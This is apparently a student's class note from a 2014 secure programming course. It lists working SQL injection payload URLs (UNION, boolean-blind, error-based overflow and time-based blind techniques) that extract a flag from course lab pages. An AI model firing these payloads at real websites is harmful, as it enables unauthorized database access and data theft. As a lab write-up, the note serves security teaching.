---
layout: post
title: 'Secure Programming 2014-12-09'
category: note
slug: secure-programming-20141209
---
2014/12/09 Secure Programming Class Note

## SQLi1

-  need encode ' '

```text
http://tor.atdog.tw:8080/union/news.php?id=1
http://tor.atdog.tw:8080/union/news.php?id=1)union(select 1,(select flag from wtf_flags))%23
```

## SQLi2

``` text
http://tor.atdog.tw:8080/boolean/login.php?u=admin&p=admin
http://tor.atdog.tw:8080/boolean/login.php?u=admin&p=admin' and exists(select 1from information_schema.tables where ord(substr((select table_name from information_schema.tables limit 1), 1, 1))=67)%23
```

-  CSRF
-  XSS

## SQLi3

-  `ooooooooofl4gsss`

```text
http://tor.atdog.tw:8080/error/index.php?id=(select 2*if((select * from (select table_name from infoorrmation_schema.tables limit 41,1)s), 18446744073709551610, 18446744073709551610)) = 1
```

-  `flag`

```text
http://tor.atdog.tw:8080/error/index.php?id=(select 2*if((select * from (select column_name from infoorrmation_schema.columns limit 1,1)s), 18446744073709551610, 18446744073709551610)) = 1
```

-  `SecProg{why_my_pay1oad_is_s0_Complic4tEd}`

```text
http://tor.atdog.tw:8080/error/index.php?id=(select 2*if((select * from (select flag from ooooooooofl4gsss limit 1,1)s), 18446744073709551610, 18446744073709551610)) = 1
```

## SQLi4

```text
http://tor.atdog.tw:8080/time/track.php?action=1 and (sleep(ascii(substr((select table_name from information_schema.tables limit 41,1),4,1))%25100)) = 1
http://tor.atdog.tw:8080/time/track.php?action=1 and (select if(((select table_name from information_schema.tables limit 41,1)='what_flags'),sleep(10),0))=1
```
